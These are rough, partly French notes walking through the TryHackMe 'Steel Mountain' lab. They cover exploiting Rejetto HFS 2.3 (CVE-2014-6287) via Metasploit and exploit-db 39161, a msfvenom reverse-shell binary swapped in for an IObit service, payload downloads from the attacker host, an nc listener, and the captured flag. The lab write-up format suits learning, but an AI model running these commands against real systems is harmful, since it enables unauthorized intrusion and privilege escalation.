

# Steel Mountain

> Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

https://tryhackme.com/room/steelmountain



export IP=10.10.81.237


https://tineye.com/

/img/BillHarper.png

> Bill Harper


http://10.10.81.237:8080

HttpFileServer 2.3
HttpFileServer httpd 2.3

https://www.rejetto.com/hfs/


> rejetto Http File Server

https://www.exploit-db.com/exploits/39161

# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

> Réponse: **2014-6287**




msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

msf5 > use exploit/windows/http/rejetto_hfs_exec

msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.81.237
msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080

run


kali@kali:~/thm/steelmountain$ locate PowerUp
/usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1


meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > power_shell
[-] Unknown command: power_shell.
meterpreter > powershell_shell
PS > 

PS > . ./PowerUp.ps1
PS > Invoke-AllChecks

(...)

[*] Checking for unquoted service paths...

ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>




On utilise `msfvenom` to generate a reverse shell as an Windows executable.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.28.128 LPORT=9001 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

```sh
meterpreter > powershell_shell
```

```ps1
PS > Get-Service 'AdvancedSystemCareService9'

Status   Name               DisplayName
------   ----               -----------
Running  AdvancedSystemC... Advanced SystemCare Service 9
```

```ps1
Get-WmiObject win32_service | ?{$_.Name -like 'AdvancedSystemCareService9'} | select PathName

PathName
--------
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

```ps1
Stop-Service -Name 'AdvancedSystemCareService9'
```



```ps1
Start-Service -Name 'AdvancedSystemCareService9'
```


```sh
kali@kali:~/thm/steelmountain$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.9.28.128] from (UNKNOWN) [10.10.179.37] 63929
```
```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
```

## [Task 4] Access and Escalation Without Metasploit

```sh
export IP=10.10.179.37
```

https://www.exploit-db.com/exploits/39161


wget https://www.exploit-db.com/raw/39161 -O exploit.py

chmod +x exploit.py

^M: bad interpreter: No such file or directory

sed -i -e 's/\r$//' exploit.py





powershell -c Invoke-WebRequest -Uri http://10.9.28.128/winPEAS.bat -OutFile winPEAS.bat

powershell -c "Get-WmiObject win32_service | ?{$_.Name -like 'AdvancedSystemCareService9'} | select PathName"

cd C:\progra~2\IObit\

powershell -c Invoke-WebRequest -Uri http://10.9.28.128/Advanced.exe -OutFile Advanced.exe

powershell -c "Stop-Service -Name 'AdvancedSystemCareService9'"

powershell -c "Start-Service -Name 'AdvancedSystemCareService9'"

https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae














C:/Program Files (x86)/IObit/Advanced SystemCare\ASCService.exe

ASCService.exe


```ps1
Import-Module ./PowerUp.ps1
Get-ServicePerms | Out-File -Encoding ASCII ServicePerms.txt
```


https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

NOK: Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>
NOK: Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9'


https://powersploit.readthedocs.io/en/latest/Privesc/Write-ServiceBinary/


NOK: Set-ServiceBinaryPath -Name 'AdvancedSystemCareService9'  -Path 'C:\temp\Advanced.exe'

OK ! Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -ServicePath 'C:\temp\Advanced.exe'

Restart-Service -Name 'AdvancedSystemCareService9'



nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP -oN nmap.shares.txt


Start-Service -Name 'AdvancedSystemCareService9'



Stop-Service -Name 'AdvancedSystemCareService9'
Get-Service -Name 'AdvancedSystemCareService9'

gsv -Name 'AdvancedSystemCareService9' | select -property *



Get-WmiObject win32_service | ?{$_.Name -like 'AdvancedSystemCareService9'} | select Name, DisplayName, State, PathName

Get-WmiObject win32_service | ?{$_.Name -like 'AdvancedSystemCareService9'} | select PathName


C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

C:/Program~3\IObit\advanc~1

NOK: SC CONFIG AdvancedSystemCareService9 binPath= "C:\temp\Advanced.exe"


NOK: Get-WmiObject win32_service -filter "Name='AdvancedSystemCareService9'" | Invoke-WmiMethod -Name Change -ArgumentList @($null,$null,$null,$null,$null,"C:\temp\Advanced.exe")


NOK: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\AdvancedSystemCareService9" -Name ImagePath -Value "C:\temp\Advanced.exe"



Get-WmiObject -ComputerName STEELMOUNTAIN -Class Win32_UserAccount -Filter "LocalAccount=True"



/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/lib/rex/proto/http/client.rb:96: warning: deprecated Object#=~ is called on FalseClass; it always returns nil
